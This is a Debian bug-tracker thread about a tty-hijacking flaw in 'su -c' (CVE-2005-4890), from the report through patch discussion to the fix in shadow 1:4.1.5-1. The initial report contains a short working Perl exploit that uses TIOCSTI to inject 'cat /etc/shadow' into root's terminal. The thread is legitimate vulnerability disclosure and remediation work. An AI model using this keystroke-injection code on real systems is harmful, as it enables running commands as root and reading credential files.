shadow, Nicolas, is more or less MIA, so I'm left nearly alone to
maintain shadow. As Nicolas was also upstream, you understand how
desperate is my situation..:-)

(maybe this bug will ring a bell for Nicolas, still)

My expertise is, as you may expect, way outreached. So, in short, what
I need is someone with enough expertise to look at this bug report and
help deciding if adopting Redhat's patch is correct (assuming it
applies: I'm not sure that RH is using the same "su" than we do).

Mail CC'ed to submitter, too, so that Daniel also knows that the only
person who answers....needs help..:-)

----- Forwarded message from Daniel Ruoso <daniel@ruoso.com> -----

Date: Wed, 1 Jun 2011 15:24:47 -0400
From: Daniel Ruoso <daniel@ruoso.com>
To: Debian Bug Tracking System <submit@bugs.debian.org>
Subject: [Pkg-shadow-devel] Bug#628843: login: tty hijacking possible in "su" via TIOCSTI ioctl
Reply-To: Daniel Ruoso <daniel@ruoso.com>, 628843@bugs.debian.org
X-CRM114-Status: Good  ( pR: 39.0933 )

Package: login
Version: 1:4.1.4.2+svn3283-2+squeeze1
Severity: critical

After investigating why RedHat have a different behavior regarding "su -c" I
found out that there was a patch in RedHat to prevent tty hijacking when using
"su -c".

What makes the hijacking possible is that "su -c" still gives the command a
controlling tty, which means it has ioctl access to /dev/tty. This means it
can send things to the tty input buffer, which will be read just after su
ends.

The original report (with patch) on RedHat (from 2005?!?!?!) is:
<https://bugzilla.redhat.com/show_bug.cgi?format=multiple&id=173008>

A very simple exploit follows (Perl code)

____BEGIN_CODE____
#!/usr/bin/perl
require "sys/ioctl.ph";
open my $tty_fh, '<', '/dev/tty' or die $!;
foreach my $c (split //, 'cat /etc/shadow'.$/) {
    ioctl($tty_fh, &TIOCSTI, $c);
}
____END_CODE____

The scenario is:

Root runs a command as a less priviledged user with "su -c", if the user was
compromised, the script will be able to run commands as root by injecting
keystrokes on the terminal.

-- System Information:
Debian Release: 6.0.1
  APT prefers stable-updates
  APT policy: (500, 'stable-updates'), (500, 'stable')
Architecture: i386 (i686)

Kernel: Linux 2.6.32-5-686 (SMP w/1 CPU core)
Locale: LANG=en_US.utf8, LC_CTYPE=en_US.utf8 (charmap=UTF-8)
Shell: /bin/sh linked to /bin/dash

Versions of packages login depends on:
ii  libc6                         2.11.2-10  Embedded GNU C Library: Shared lib
ii  libpam-modules                1.1.1-6.1  Pluggable Authentication Modules f
ii  libpam-runtime                1.1.1-6.1  Runtime support for the PAM librar
ii  libpam0g                      1.1.1-6.1  Pluggable Authentication Modules l

login recommends no packages.

login suggests no packages.

-- no debconf information

_______________________________________________
Pkg-shadow-devel mailing list
Pkg-shadow-devel@lists.alioth.debian.org
<http://lists.alioth.debian.org/cgi-bin/mailman/listinfo/pkg-shadow-devel>

----- End forwarded message -----

--

```
```
[[signature.asc](bugreport.cgi?att=1;bug=628843;filename=signature.asc;msg=10) (application/pgp-signature, inline)]
```

---

**Added tag(s) security and help.**
Request was from `Christian PERRIER <bubulle@debian.org>`
to `control@bugs.debian.org`.
(Thu, 02 Jun 2011 05:39:10 GMT) ([full text](bugreport.cgi?bug=628843;msg=12), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=12), [link](#11)).

---

**Message sent on**
to `Daniel Ruoso <daniel@ruoso.com>`:

Bug#628843.
(Thu, 02 Jun 2011 05:39:12 GMT) ([full text](bugreport.cgi?bug=628843;msg=14), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=14), [link](#13)).

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#628843`; Package `login`.
(Thu, 02 Jun 2011 12:18:03 GMT) ([full text](bugreport.cgi?bug=628843;msg=17), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=17), [link](#16)).

---

**Acknowledgement sent**
to `Daniel Ruoso <daniel@ruoso.com>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Thu, 02 Jun 2011 12:18:03 GMT) ([full text](bugreport.cgi?bug=628843;msg=19), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=19), [link](#18)).

---

[Message #20](#20) received at 628843@bugs.debian.org ([full text](bugreport.cgi?bug=628843;msg=20), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=20), reply):

![](/cgi-bin/libravatar.cgi?email=daniel%40ruoso.com)
From: Daniel Ruoso <daniel@ruoso.com>
To: Christian PERRIER <bubulle@debian.org>
Cc: team@security.debian.org, 628843@bugs.debian.org
Subject: Re: Bug#628843: (forw) [Pkg-shadow-devel] Bug#628843: login: tty
hijacking possible in "su" via TIOCSTI ioctl
Date: Thu, 2 Jun 2011 09:14:27 -0300
```
[[Message part 1](bugreport.cgi?att=0;bug=628843;msg=20) (text/plain, inline)]
```
```
On Thu, Jun 02, 2011 at 07:34:59AM +0200, Christian PERRIER wrote:
> My expertise is, as you may expect, way outreached. So, in short, what
> I need is someone with enough expertise to look at this bug report and
> help deciding if adopting Redhat's patch is correct (assuming it
> applies: I'm not sure that RH is using the same "su" than we do).

Ok, to give more context to the fix applied by RedHat.

What they did was use setsid() to start a new session and remove the
controlling terminal from the running command. This removes from the
child process the ability to open "/dev/tty", which is how the
hijacking works.

But doing only that is complicated because the translation of Ctrl+C
to SIGINT depends on controlling the tty, so you wouldn't be able to
stop the process easily. What they did was simply to add SIGINT to the
signal mask that causes the su to exit the waitpit loop.

The thing I don't like about RedHat's patch is that it turns a SIGINT
on su into a SIGTERM to the process, it would be better to send the
same signal received.

I don't have the time to do it right now, but I can give a shot on
writing a patch that preserves the signal interaction sane, which is
not the case in RedHat.

daniel

```
```
[[signature.asc](bugreport.cgi?att=1;bug=628843;filename=signature.asc;msg=20) (application/pgp-signature, inline)]
```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#628843`; Package `login`.
(Sat, 04 Jun 2011 18:00:03 GMT) ([full text](bugreport.cgi?bug=628843;msg=22), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=22), [link](#21)).

---

**Acknowledgement sent**
to `Nicolas François <nicolas.francois@centraliens.net>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Sat, 04 Jun 2011 18:00:03 GMT) ([full text](bugreport.cgi?bug=628843;msg=24), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=24), [link](#23)).

---

[Message #25](#25) received at 628843@bugs.debian.org ([full text](bugreport.cgi?bug=628843;msg=25), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=25), reply):

![](/cgi-bin/libravatar.cgi?email=nicolas.francois%40centraliens.net)
From: Nicolas François <nicolas.francois@centraliens.net>
To: Daniel Ruoso <daniel@ruoso.com>, 628843@bugs.debian.org
Cc: Christian PERRIER <bubulle@debian.org>, team@security.debian.org
Subject: Re: Bug#628843: login: tty hijacking possible in "su" via TIOCSTI
ioctl
Date: Sat, 4 Jun 2011 19:58:03 +0200
```
[[Message part 1](bugreport.cgi?att=0;bug=628843;msg=25) (text/plain, inline)]
```
```
Hello,

Here is a patch proposal. It forwards the right signal to the child also
supports SIGTSTP.

I would appreciate if this could be reviewed by somebody more confident
with signal processing than me.

I expect sudo to have the same issue.

Also sg probably has the same issue (i.e. it cannot be used to drop group
privileges). I will look at it.

Other utils to switch user or group might also be affected.
(Anybody got a list and could try?)

Best Regards,
--
Nekral

```
```
[[su_628843.patch](bugreport.cgi?att=1;bug=628843;filename=su_628843.patch;msg=25) (text/x-diff, attachment)]
```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#628843`; Package `login`.
(Thu, 09 Jun 2011 19:57:03 GMT) ([full text](bugreport.cgi?bug=628843;msg=27), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=27), [link](#26)).

---

**Acknowledgement sent**
to `Thijs Kinkhorst <thijs@debian.org>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Thu, 09 Jun 2011 19:57:03 GMT) ([full text](bugreport.cgi?bug=628843;msg=29), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=29), [link](#28)).

---

[Message #30](#30) received at 628843@bugs.debian.org ([full text](bugreport.cgi?bug=628843;msg=30), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=30), reply):

![](/cgi-bin/libravatar.cgi?email=thijs%40debian.org)
From: Thijs Kinkhorst <thijs@debian.org>
To: Christian PERRIER <bubulle@debian.org>
Cc: team@security.debian.org,
628843@bugs.debian.org,
628843-submitter@bugs.debian.org
Subject: Re: (forw) [Pkg-shadow-devel] Bug#628843: login: tty hijacking possible in "su" via TIOCSTI ioctl
Date: Thu, 9 Jun 2011 21:53:43 +0200
```
Op donderdag 02 juni 2011 07:34:59 schreef Christian PERRIER:
> Security team, I need advice and help here. My co-maintainer for
> shadow, Nicolas, is more or less MIA, so I'm left nearly alone to
> maintain shadow. As Nicolas was also upstream, you understand how
> desperate is my situation..:-)
>
> (maybe this bug will ring a bell for Nicolas, still)
>
> My expertise is, as you may expect, way outreached. So, in short, what
> I need is someone with enough expertise to look at this bug report and
> help deciding if adopting Redhat's patch is correct (assuming it
> applies: I'm not sure that RH is using the same "su" than we do).
>
> Mail CC'ed to submitter, too, so that Daniel also knows that the only
> person who answers....needs help..:-)

Hi Christian,

I'm just mailing to confirm that we did record the issue in our tracker and to
point out that this issue is currently also discueed on oss-security:
<http://thread.gmane.org/gmane.comp.security.oss.general/5172>

Thijs

```

---

**Message sent on**
to `Daniel Ruoso <daniel@ruoso.com>`:

Bug#628843.
(Thu, 09 Jun 2011 19:57:06 GMT) ([full text](bugreport.cgi?bug=628843;msg=32), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=32), [link](#31)).

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#628843`; Package `login`.
(Fri, 10 Jun 2011 19:06:11 GMT) ([full text](bugreport.cgi?bug=628843;msg=35), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=35), [link](#34)).

---

**Acknowledgement sent**
to `Christian PERRIER <bubulle@debian.org>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Fri, 10 Jun 2011 19:06:11 GMT) ([full text](bugreport.cgi?bug=628843;msg=37), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=37), [link](#36)).

---

[Message #38](#38) received at 628843@bugs.debian.org ([full text](bugreport.cgi?bug=628843;msg=38), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=38), reply):

![](/cgi-bin/libravatar.cgi?email=bubulle%40debian.org)
From: Christian PERRIER <bubulle@debian.org>
To: 628843@bugs.debian.org
Cc: 628843-submitter@bugs.debian.org, team@security.debian.org
Subject: Re: [Pkg-shadow-devel] Bug#628843: (forw) Bug#628843: login: tty
hijacking possible in "su" via TIOCSTI ioctl
Date: Fri, 10 Jun 2011 07:33:40 +0200
```
[[Message part 1](bugreport.cgi?att=0;bug=628843;msg=38) (text/plain, inline)]
```
```
Quoting Thijs Kinkhorst (thijs@debian.org):

> Hi Christian,
>
> I'm just mailing to confirm that we did record the issue in our tracker and to
> point out that this issue is currently also discueed on oss-security:
> <http://thread.gmane.org/gmane.comp.security.oss.general/5172>

Thanks, Thijs, for your answer.

I'm more reliefed now that Nicolas popped up and even proposed a
preliminary patch. I don't have the expertise to give any advice about
his patch but I think that we have there a good start for  an
up-to-come fix.

During last week, Nicolas was active "cleaning out" things for shadow
so I think we can have some good hope to have a fixed issue at some
moment in the near future...

But, as Nicolas mentioned, an expert review of his proposal would be
very much welcomed.

```
```
[[signature.asc](bugreport.cgi?att=1;bug=628843;filename=signature.asc;msg=38) (application/pgp-signature, inline)]
```

---

**Message sent on**
to `Daniel Ruoso <daniel@ruoso.com>`:

Bug#628843.
(Fri, 10 Jun 2011 19:06:15 GMT) ([full text](bugreport.cgi?bug=628843;msg=40), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=40), [link](#39)).

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#628843`; Package `login`.
(Sat, 11 Jun 2011 15:15:03 GMT) ([full text](bugreport.cgi?bug=628843;msg=43), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=43), [link](#42)).

---

**Acknowledgement sent**
to `Nicolas François <nicolas.francois@centraliens.net>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Sat, 11 Jun 2011 15:15:03 GMT) ([full text](bugreport.cgi?bug=628843;msg=45), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=45), [link](#44)).

---

[Message #46](#46) received at 628843@bugs.debian.org ([full text](bugreport.cgi?bug=628843;msg=46), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=46), reply):

![](/cgi-bin/libravatar.cgi?email=nicolas.francois%40centraliens.net)
From: Nicolas François <nicolas.francois@centraliens.net>
To: 628843@bugs.debian.org
Cc: 628843-submitter@bugs.debian.org, team@security.debian.org
Subject: Re: [Pkg-shadow-devel] Bug#628843: Bug#628843: (forw) Bug#628843:
login: tty hijacking possible in "su" via TIOCSTI ioctl
Date: Sat, 11 Jun 2011 17:12:54 +0200
```
Hello,

One more point to be reviewed.

shadow-utils supports also configurations where PAM is not used.
In that case, su does not fork to exec the interactive shell / command, so
I cannot use setsid().

In that case, I intend to use:

#include <termios.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
	int fd;
	if ((fd = open ("/dev/tty", O_RDWR)) >= 0) {
		ioctl (fd, TIOCNOTTY, (char *) 0);
		close (fd);
	}

I think this should be sufficient to protect the terminal (i.e.
re-attaching to it is not possible). This looks simpler than:
	pid_t child = fork();
	if (child == -1) {
		...
	} else if (child > 0) {
		_exit(0);
	}
	setsid();
(In this version I would need again to handle the signals manually instead
of the _exit())

Also if the above ioctl is sufficient, is there a benefit from setsid()?

Best Regards,
--
Nekral

```

---

**Message sent on**
to `Daniel Ruoso <daniel@ruoso.com>`:

Bug#628843.
(Sat, 11 Jun 2011 15:15:05 GMT) ([full text](bugreport.cgi?bug=628843;msg=48), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=48), [link](#47)).

---

**Added tag(s) pending.**
Request was from `Nicolas FRANCOIS (Nekral) <nicolas.francois@centraliens.net>`
to `control@bugs.debian.org`.
(Sat, 25 Jun 2011 07:57:15 GMT) ([full text](bugreport.cgi?bug=628843;msg=51), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=51), [link](#50)).

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#628843`; Package `login`.
(Sat, 15 Oct 2011 21:36:11 GMT) ([full text](bugreport.cgi?bug=628843;msg=53), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=53), [link](#52)).

---

**Acknowledgement sent**
to `Arne Wichmann <aw@anhrefn.saar.de>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Sat, 15 Oct 2011 21:36:12 GMT) ([full text](bugreport.cgi?bug=628843;msg=55), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=55), [link](#54)).

---

[Message #56](#56) received at 628843@bugs.debian.org ([full text](bugreport.cgi?bug=628843;msg=56), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=56), reply):

![](/cgi-bin/libravatar.cgi?email=aw%40anhrefn.saar.de)
From: Arne Wichmann <aw@anhrefn.saar.de>
To: 628843@bugs.debian.org
Subject: Ping
Date: Sat, 15 Oct 2011 23:13:47 +0200
```
[[Message part 1](bugreport.cgi?att=0;bug=628843;msg=56) (text/plain, inline)]
```
```
This critical bug is now pending for more than 3 months. Is there any
update on the situation?

cu

AW
--
[...] If you don't want to be restricted, don't agree to it. If you are
coerced, comply as much as you must to protect yourself, just don't support
it. Noone can free you but yourself. (crag, on Debian Planet)
Arne Wichmann (aw@linux.de)

```
```
[[signature.asc](bugreport.cgi?att=1;bug=628843;filename=signature.asc;msg=56) (application/pgp-signature, inline)]
```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#628843`; Package `login`.
(Sun, 16 Oct 2011 16:03:08 GMT) ([full text](bugreport.cgi?bug=628843;msg=58), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=58), [link](#57)).

---

**Acknowledgement sent**
to `Christian PERRIER <bubulle@debian.org>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Sun, 16 Oct 2011 16:03:08 GMT) ([full text](bugreport.cgi?bug=628843;msg=60), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=60), [link](#59)).

---

[Message #61](#61) received at 628843@bugs.debian.org ([full text](bugreport.cgi?bug=628843;msg=61), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=61), reply):

![](/cgi-bin/libravatar.cgi?email=bubulle%40debian.org)
From: Christian PERRIER <bubulle@debian.org>
To: Arne Wichmann <aw@anhrefn.saar.de>, 628843@bugs.debian.org
Subject: Re: [Pkg-shadow-devel] Bug#628843: Ping
Date: Sun, 16 Oct 2011 17:20:31 +0200
```
[[Message part 1](bugreport.cgi?att=0;bug=628843;msg=61) (text/plain, inline)]
```
```
Quoting Arne Wichmann (aw@anhrefn.saar.de):
> This critical bug is now pending for more than 3 months. Is there any
> update on the situation?

Nicolas should actually release upstream 4.1.5 and thenupload
4.1.5-1. Nicolas?

```
```
[[signature.asc](bugreport.cgi?att=1;bug=628843;filename=signature.asc;msg=61) (application/pgp-signature, inline)]
```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#628843`; Package `login`.
(Mon, 17 Oct 2011 21:27:05 GMT) ([full text](bugreport.cgi?bug=628843;msg=63), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=63), [link](#62)).

---

**Acknowledgement sent**
to `Nicolas François <nicolas.francois@centraliens.net>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Mon, 17 Oct 2011 21:27:05 GMT) ([full text](bugreport.cgi?bug=628843;msg=65), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=65), [link](#64)).

---

[Message #66](#66) received at 628843@bugs.debian.org ([full text](bugreport.cgi?bug=628843;msg=66), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=66), reply):

![](/cgi-bin/libravatar.cgi?email=nicolas.francois%40centraliens.net)
From: Nicolas François <nicolas.francois@centraliens.net>
To: 628843@bugs.debian.org
Cc: Arne Wichmann <aw@anhrefn.saar.de>
Subject: Re: Bug#628843: Ping
Date: Mon, 17 Oct 2011 23:17:32 +0200
```
Hello,

On Sun, Oct 16, 2011 at 05:20:31PM +0200, bubulle@debian.org wrote:
> Quoting Arne Wichmann (aw@anhrefn.saar.de):
> > This critical bug is now pending for more than 3 months. Is there any
> > update on the situation?
>
> Nicolas should actually release upstream 4.1.5 and then upload
> 4.1.5-1. Nicolas?

Yes, this is the plan.
There are still some untested changes, and I still have a few uncommitted
changes on my tree.

Regarding this bug
 * Arne, I do not know if your ping was related to the potential security
   impact, but it could help to have an assessment of the proposed solution
   (and also comment 46)
 * It did not seem that critical to me (e.g. in the pointed
   comp.security.oss.general thread, there were no agreement for a CVE)

--
Nekral

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#628843`; Package `login`.
(Wed, 19 Oct 2011 13:15:06 GMT) ([full text](bugreport.cgi?bug=628843;msg=68), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=68), [link](#67)).

---

**Acknowledgement sent**
to `Arne Wichmann <aw@anhrefn.saar.de>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Wed, 19 Oct 2011 13:15:25 GMT) ([full text](bugreport.cgi?bug=628843;msg=70), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=70), [link](#69)).

---

[Message #71](#71) received at 628843@bugs.debian.org ([full text](bugreport.cgi?bug=628843;msg=71), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=71), reply):

![](/cgi-bin/libravatar.cgi?email=aw%40anhrefn.saar.de)
From: Arne Wichmann <aw@anhrefn.saar.de>
To: Nicolas François <nicolas.francois@centraliens.net>
Cc: 628843@bugs.debian.org
Subject: Re: Bug#628843: Ping
Date: Wed, 19 Oct 2011 15:07:56 +0200
```
[[Message part 1](bugreport.cgi?att=0;bug=628843;msg=71) (text/plain, inline)]
```
```
begin  quotation  from Nicolas François (in <20111017211732.GJ16703@nekral.nekral.homelinux.net>):
> On Sun, Oct 16, 2011 at 05:20:31PM +0200, bubulle@debian.org wrote:
> > Quoting Arne Wichmann (aw@anhrefn.saar.de):
> > > This critical bug is now pending for more than 3 months. Is there any
> > > update on the situation?
> >
> > Nicolas should actually release upstream 4.1.5 and then upload
> > 4.1.5-1. Nicolas?
>
> Yes, this is the plan.
> There are still some untested changes, and I still have a few uncommitted
> changes on my tree.
>
> Regarding this bug
>  * Arne, I do not know if your ping was related to the potential security
>    impact, but it could help to have an assessment of the proposed solution
>    (and also comment 46)

Ok, let me think...

- @@ -264,6 +264,11 @@
  This has the effect that "su -c ... " can no longer be used to call
  programs which use terminals - for example dialog. This should at least
  be prominently documented.

The rest looks like it could work. But I would not call myself a specialist
on Unix tty-handling.

The last sentence applies to comment 46, too.

>  * It did not seem that critical to me (e.g. in the pointed
>    comp.security.oss.general thread, there were no agreement for a CVE)

I do not really want to argue about bug severity here - this assessment is
better left to you. I did however use su in the past in non-interactive
scripts to lower privileges - if this isn't supported it should at least be
documented, again... ;-)

cu

AW
--
[...] If you don't want to be restricted, don't agree to it. If you are
coerced, comply as much as you must to protect yourself, just don't support
it. Noone can free you but yourself. (crag, on Debian Planet)
Arne Wichmann (aw@linux.de)

```
```
[[signature.asc](bugreport.cgi?att=1;bug=628843;filename=signature.asc;msg=71) (application/pgp-signature, inline)]
```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#628843`; Package `login`.
(Fri, 23 Dec 2011 20:24:05 GMT) ([full text](bugreport.cgi?bug=628843;msg=73), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=73), [link](#72)).

---

**Acknowledgement sent**
to `Moritz Muehlenhoff <jmm@inutil.org>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Fri, 23 Dec 2011 20:24:05 GMT) ([full text](bugreport.cgi?bug=628843;msg=75), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=75), [link](#74)).

---

[Message #76](#76) received at 628843@bugs.debian.org ([full text](bugreport.cgi?bug=628843;msg=76), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=76), reply):

![](/cgi-bin/libravatar.cgi?email=jmm%40inutil.org)
From: Moritz Muehlenhoff <jmm@inutil.org>
To: Nicolas François <nicolas.francois@centraliens.net>
Cc: 628843@bugs.debian.org, team@security.debian.org
Subject: Re: Bug#628843: Ping
Date: Fri, 23 Dec 2011 21:19:50 +0100
```
On Mon, Oct 17, 2011 at 11:17:32PM +0200, Nicolas François wrote:

> Regarding this bug
>  * Arne, I do not know if your ping was related to the potential security
>    impact, but it could help to have an assessment of the proposed solution
>    (and also comment 46)

Judging from the available documentation it seems fine, but I suggest
you consult Alan Cox (alan@linux.intel.com), who's done most of the
Linux tty scrutiny in the recent years for a second opinion.

>  * It did not seem that critical to me (e.g. in the pointed
>    comp.security.oss.general thread, there were no agreement for a CVE)

FWIW, this has been assigned [CVE-2005-4890](https://security-tracker.debian.org/tracker/CVE-2005-4890) in the mean time. This has
low impact, but it would be nice if we could fix this up in a stable
point update for Squeeze.

Cheers,
        Moritz

```

---

**Reply sent**
to `Nicolas FRANCOIS (Nekral) <nicolas.francois@centraliens.net>`:

You have taken responsibility.
(Sun, 12 Feb 2012 23:37:05 GMT) ([full text](bugreport.cgi?bug=628843;msg=78), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=78), [link](#77)).

---

**Notification sent**
to `Daniel Ruoso <daniel@ruoso.com>`:

Bug acknowledged by developer.
(Sun, 12 Feb 2012 23:37:05 GMT) ([full text](bugreport.cgi?bug=628843;msg=80), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=80), [link](#79)).

---

[Message #81](#81) received at 628843-close@bugs.debian.org ([full text](bugreport.cgi?bug=628843;msg=81), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=81), reply):

![](/cgi-bin/libravatar.cgi?email=nicolas.francois%40centraliens.net)
From: Nicolas FRANCOIS (Nekral) <nicolas.francois@centraliens.net>
To: 628843-close@bugs.debian.org
Subject: Bug#628843: fixed in shadow 1:4.1.5-1
Date: Sun, 12 Feb 2012 23:34:18 +0000
```
Source: shadow
Source-Version: 1:4.1.5-1

We believe that the bug you reported is fixed in the latest version of
shadow, which is due to be installed in the Debian FTP archive:

login_4.1.5-1_i386.deb
  to main/s/shadow/login_4.1.5-1_i386.deb
passwd_4.1.5-1_i386.deb
  to main/s/shadow/passwd_4.1.5-1_i386.deb
shadow_4.1.5-1.diff.gz
  to main/s/shadow/shadow_4.1.5-1.diff.gz
shadow_4.1.5-1.dsc
  to main/s/shadow/shadow_4.1.5-1.dsc
shadow_4.1.5.orig.tar.gz
  to main/s/shadow/shadow_4.1.5.orig.tar.gz

A summary of the changes between this version and the previous one is
attached.

Thank you for reporting the bug, which will now be closed.  If you
have further comments please address them to 628843@bugs.debian.org,
and the maintainer will reopen the bug report if appropriate.

Debian distribution maintenance software
pp.
Nicolas FRANCOIS (Nekral) <nicolas.francois@centraliens.net> (supplier of updated shadow package)

(This message was generated automatically at their request; if you
believe that there is a problem with it please contact the archive
administrators by mailing ftpmaster@debian.org)

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Format: 1.8
Date: Sun, 12 Feb 2012 22:27:03 +0100
Source: shadow
Binary: passwd login
Architecture: source i386
Version: 1:4.1.5-1
Distribution: unstable
Urgency: low
Maintainer: Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>
Changed-By: Nicolas FRANCOIS (Nekral) <nicolas.francois@centraliens.net>
Description:
 login      - system login tools
 passwd     - change and administer password and group data
Closes: [544184](bugreport.cgi?bug=544184) [580434](bugreport.cgi?bug=580434) [584868](bugreport.cgi?bug=584868) [597661](bugreport.cgi?bug=597661) [602264](bugreport.cgi?bug=602264) [603315](bugreport.cgi?bug=603315) [605329](bugreport.cgi?bug=605329) [606159](bugreport.cgi?bug=606159) [609117](bugreport.cgi?bug=609117) [614321](bugreport.cgi?bug=614321) [616167](bugreport.cgi?bug=616167) [617295](bugreport.cgi?bug=617295) [620930](bugreport.cgi?bug=620930) [620978](bugreport.cgi?bug=620978) [621126](bugreport.cgi?bug=621126) [621330](bugreport.cgi?bug=621330) [621810](bugreport.cgi?bug=621810) [622106](bugreport.cgi?bug=622106) [622765](bugreport.cgi?bug=622765) [622834](bugreport.cgi?bug=622834) [622908](bugreport.cgi?bug=622908) [623608](bugreport.cgi?bug=623608) [623722](bugreport.cgi?bug=623722) [627526](bugreport.cgi?bug=627526) [628776](bugreport.cgi?bug=628776) [628777](bugreport.cgi?bug=628777) [628843](bugreport.cgi?bug=628843) [630250](bugreport.cgi?bug=630250) [630618](bugreport.cgi?bug=630618) [632461](bugreport.cgi?bug=632461) [634465](bugreport.cgi?bug=634465) [636047](bugreport.cgi?bug=636047) [647308](bugreport.cgi?bug=647308) [647469](bugreport.cgi?bug=647469) [655194](bugreport.cgi?bug=655194) [655858](bugreport.cgi?bug=655858) [656503](bugreport.cgi?bug=656503) [656686](bugreport.cgi?bug=656686) [657010](bugreport.cgi?bug=657010) [657514](bugreport.cgi?bug=657514) [657516](bugreport.cgi?bug=657516) [657621](bugreport.cgi?bug=657621) [657622](bugreport.cgi?bug=657622) [657710](bugreport.cgi?bug=657710) [657717](bugreport.cgi?bug=657717)
Changes:
 shadow (1:4.1.5-1) unstable; urgency=low
 .
   * The "Charolais" release.
 .
   [ Nicolas FRANCOIS (Nekral) ]
   * New upstream release:
     - su: Fix possible tty hijacking by dropping the controlling terminal when
       executing a command ([CVE-2005-4890](https://security-tracker.debian.org/tracker/CVE-2005-4890)). Closes: #[628843](bugreport.cgi?bug=628843)
     - userdel: Check the existence of the user's mail spool before trying to
       remove it. If it does not exist, a warning is issued, but no failure.
       Closes: #[617295](bugreport.cgi?bug=617295)
     - userdel: Do not remove a group with the same name as the user
       (usergroup) if this group isn't the user's primary group.
       Closes: #[584868](bugreport.cgi?bug=584868)
     - su: Close the PAM session as root (fix issues with pam_mount and
       pam_systemd). Closes: #[580434](bugreport.cgi?bug=580434)
     - Fix several typos in manpages. Thanks to Simon Brandmair.
       Closes: #[628776](bugreport.cgi?bug=628776)
     - userdel error message has been clarified when the user is still
       executing processes (it used to complain that the user is logged in).
       Closes: #[603315](bugreport.cgi?bug=603315)
     - passwd(1) references chpasswd(8). Closes: #[609117](bugreport.cgi?bug=609117)
     - Spaces have been added between options and arguments in the Russian
       manpages. Closes: #[606159](bugreport.cgi?bug=606159)
